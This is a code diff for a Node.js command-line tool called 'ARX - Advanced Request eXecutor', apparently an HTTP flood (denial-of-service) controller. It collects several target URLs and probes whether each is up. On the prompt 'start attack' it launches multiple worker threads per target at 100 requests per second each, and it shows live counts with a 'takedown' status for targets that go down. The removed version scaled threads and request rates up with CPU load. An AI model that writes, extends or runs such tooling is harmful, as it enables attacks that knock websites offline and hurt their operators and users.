@@ -2,121 +2,100 @@
 const readline = require('readline');
 const { Worker } = require('worker_threads');
 const os = require('os');
+const chalk = require('chalk');
 const http = require('http');
 
+console.clear();
+console.log(chalk.greenBright.bold('Selamat datang di ARX - Advanced Request eXecutor [AutoScale]'));
+
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+readline.emitKeypressEvents(process.stdin);
+if (process.stdin.isTTY) process.stdin.setRawMode(true);
 
-let targets = [];
-let currentTarget = null;
-let targetId = 0;
-let workers = [];
-let running = false;
-let statsMap = new Map();
+let targets = [], workers = [], stats = {}, statuses = {}, started = false;
 
-function ask(query) {
-  return new Promise(resolve => rl.question(query, resolve));
+function askURL(index = 0) {
+  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async url => {
+    if (!url.trim()) {
+      if (targets.length === 0) return askURL(index);
+      return askCommand();
+    }
+    const isLive = await testTarget(url.trim());
+    targets.push(url.trim());
+    statuses[url.trim()] = isLive ? 'live' : 'down';
+    stats[url.trim()] = { sent: 0, success: 0, failed: 0 };
+    askURL(index + 1);
+  });
 }
 
-function checkTarget(url) {
+function askCommand() {
+  rl.question('Type "start" to begin attack: ', (input) => {
+    if (input.trim().toLowerCase() === 'start') {
+      startAttack();
+    } else {
+      askCommand();
+    }
+  });
+}
+
+function testTarget(url) {
   return new Promise(resolve => {
-    const req = http.get(url, res => {
-      resolve(res.statusCode >= 200 && res.statusCode < 400);
+    const req = http.get(url, { timeout: 5000 }, res => {
+      res.resume();
+      resolve(true);
     });
     req.on('error', () => resolve(false));
-    req.setTimeout(3000, () => {
-      req.abort();
+    req.on('timeout', () => {
+      req.destroy();
       resolve(false);
     });
   });
 }
 
-async function main() {
-  console.log('\x1b[36m%s\x1b[0m', 'Selamat datang di ARX - Advanced Request eXecutor');
-  while (true) {
-    const url = await ask('Target URL: ');
-    targets.push({ url, id: targetId++, rps: 10, threads: 1 });
-    currentTarget = targets[targets.length - 1];
-    console.log(`[INFO] Testing target ${url}...`);
-    const alive = await checkTarget(url);
-    if (!alive) {
-      console.log(`\x1b[31m[ERROR]\x1b[0m Target ${url} is unreachable.`);
-      continue;
+function startAttack() {
+  started = true;
+  targets.forEach((url, i) => {
+    const cpuCount = os.cpus().length;
+    const threads = Math.min(10, cpuCount);
+    const rps = 100;
+    for (let j = 0; j < threads; j++) {
+      const worker = new Worker('./worker.js');
+      worker.postMessage({ url, rps });
+      worker.on('message', ({ sent, success, failed }) => {
+        stats[url].sent += sent;
+        stats[url].success += success;
+        stats[url].failed += failed;
+      });
+      workers.push(worker);
     }
-    console.log(`[INFO] Target ${url} is live.`);
-    startTarget(currentTarget);
-    waitCommand();
-    break;
-  }
+  });
+  displayStats();
+  listenCommand();
 }
 
-function startTarget(target) {
-  running = true;
-  for (let i = 0; i < target.threads; i++) {
-    const worker = new Worker('./worker.js');
-    worker.postMessage({ url: target.url, rps: target.rps });
-    worker.on('message', msg => {
-      if (!statsMap.has(target.id)) {
-        statsMap.set(target.id, { sent: 0, success: 0, failed: 0 });
-      }
-      const s = statsMap.get(target.id);
-      s.sent += msg.sent;
-      s.success += msg.success;
-      s.failed += msg.failed;
+function displayStats() {
+  setInterval(() => {
+    readline.cursorTo(process.stdout, 0, 2);
+    targets.forEach((url, i) => {
+      const s = stats[url];
+      const status = statuses[url] === 'live' ? chalk.greenBright('live') : chalk.redBright('takedown');
+      readline.clearLine(process.stdout, 0);
+      process.stdout.write(`[STATS #${i}] ${chalk.yellow('Sent')}: ${s.sent} | ${chalk.green('Success')}: ${s.success} | ${chalk.red('Failed')}: ${s.failed} | ${chalk.cyan('Target')}: ${url} | ${status}\n`);
     });
-    workers.push(worker);
-  }
-  monitor(target);
-  printStats();
+    readline.moveCursor(process.stdout, 0, 1);
+    readline.clearLine(process.stdout, 0);
+    process.stdout.write('Command (stop): ');
+  }, 1000);
 }
 
-function stopTarget() {
-  running = false;
-  workers.forEach(w => w.terminate());
-  workers = [];
-  console.log(`\n\x1b[33m[STOPPED]\x1b[0m Target ${currentTarget.url}`);
-}
-
-function waitCommand() {
+function listenCommand() {
   rl.on('line', line => {
-    const input = line.trim();
-    if (input === 'stop') {
-      stopTarget();
-    } else if (input === 'next') {
-      stopTarget();
-      main();
+    if (line.trim().toLowerCase() === 'stop') {
+      workers.forEach(w => w.terminate());
+      console.log(chalk.redBright('\n[STOPPED] All targets stopped.'));
+      process.exit(0);
     }
   });
 }
 
-function monitor(target) {
-  setInterval(() => {
-    if (!running) return;
-    const cpuLoad = os.loadavg()[0] / os.cpus().length;
-    if (cpuLoad < 0.8) {
-      target.threads++;
-      target.rps += 10;
-      const worker = new Worker('./worker.js');
-      worker.postMessage({ url: target.url, rps: target.rps });
-      worker.on('message', msg => {
-        const s = statsMap.get(target.id);
-        s.sent += msg.sent;
-        s.success += msg.success;
-        s.failed += msg.failed;
-      });
-      workers.push(worker);
-    }
-  }, 30000);
-}
-
-function printStats() {
-  setInterval(() => {
-    if (!running) return;
-    statsMap.forEach((s, id) => {
-      readline.cursorTo(process.stdout, 0);
-      process.stdout.write(`\x1b[32m[STATS #${id}]\x1b[0m Sent: ${s.sent} | Success: ${s.success} | Failed: ${s.failed}    `);
-    });
-    readline.moveCursor(process.stdout, 0, 1);
-  }, 60000);
-}
-
-main();
+askURL();
